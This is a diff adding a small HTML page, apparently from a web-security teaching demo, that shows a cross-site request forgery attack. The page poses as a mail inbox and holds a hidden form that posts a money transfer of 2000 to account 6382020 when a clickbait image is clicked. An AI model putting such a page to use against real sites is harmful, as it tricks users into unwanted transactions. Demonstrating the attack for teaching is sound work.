@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>CSRF</title>
+    <link rel='stylesheet' href='/stylesheets/style.css' />
+  </head>
+  <body>
+    <h1>Mail Inbox</h1>
+       <form id="scamForm" action="/examples/csrf-target" method="post">
+       <input id="username" name="username" type="hidden" value="MosheCohen"/>
+       <input type="hidden" id="sum" name="sum" value="2000" />
+       <input type="hidden" id="name" name="name" value="6382020" />
+     </form>
+    <a onclick="moveClientWithPOST()" href="#"><img id="clickbait" src="/images/clickbait.jpg" /></a>
+    <script>
+      function moveClientWithPOST() {
+        const scamForm = document.getElementById('scamForm');
+        scamForm.submit();
+      }
+    </script>
+  </body>
+  
+</html>
